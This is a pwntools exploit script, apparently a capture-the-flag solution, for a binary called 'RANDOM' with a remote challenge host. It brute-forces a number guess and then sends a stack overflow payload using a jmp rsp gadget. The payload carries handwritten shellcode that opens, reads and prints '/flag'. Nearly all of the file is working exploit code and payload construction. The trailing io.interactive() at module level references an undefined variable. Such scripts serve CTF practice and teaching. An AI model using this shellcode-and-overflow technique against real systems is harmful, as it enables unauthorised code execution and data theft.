from pwn import *
from pwnlib.fmtstr import WRITE_SIZE
from pwnlib.gdb import find_module_addresses
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
#elf = ELF('./')

context.log_level = 'debug'

open_shellcode = asm('''
push rsi
pop rdi
add rdi, 0x20
mov rsi, 0
mov rax, 2
syscall
mov rcx, 0x40091D
call rcx
''')

read_shellcode = asm('''
mov rdi, 3
mov rsi, 0x601fd0 
mov rdx, 0x100
mov rax, 0
syscall
mov rcx, 0x40091D
call rcx
''')

#write_shellcode = asm('''
#mov rdi, 1
#mov rsi, 0x601fd0 
#mov rdx, 0x100
#mov rax, 1
#syscall
#mov rcx, 0x40091D
#call rcx
#'''
#)

write_shellcode = asm('''
mov rdi, 0x601fd0
mov rcx, 0x4006C0
call rcx

''')

debug = 1

def exp():
    if debug:
        io = process('./RANDOM')
    else:
        io = remote('node6.anna.nssctf.cn',28979)

    for i in range(100):
        io.sendlineafter(b"please input a guess num:",str(17).encode())
        io.recvline()
        feedbake = io.recvline()
        print(feedbake)
        if (feedbake == b"good guys\n"):
            success("guess success !")
            payload = open_shellcode.ljust(0x20,b'\x00')
            payload += b'/flag\x00\x00\x00'
            payload += p64(0x40094E) # jmp rsp
            payload += asm("jmp rsi")
            #gdb.attach(proc.pidof(io)[0])
            io.sendafter(b"your door",payload)

            # read
            payload = read_shellcode.ljust(0x28,b'\x00')
            payload += p64(0x40094E) # jmp rsp
            payload += asm("jmp rsi")
            #gdb.attach(proc.pidof(io)[0])
            io.sendafter(b"your door",payload)

            # write
            payload = write_shellcode.ljust(0x28,b'\x00')
            payload += p64(0x40094E) # jmp rsp
            payload += asm("jmp rsi")
            #gdb.attach(proc.pidof(io)[0])
            io.sendafter(b"your door",payload)
            io.interactive()
 

#one_gadget = [,,]

exp()


io.interactive()

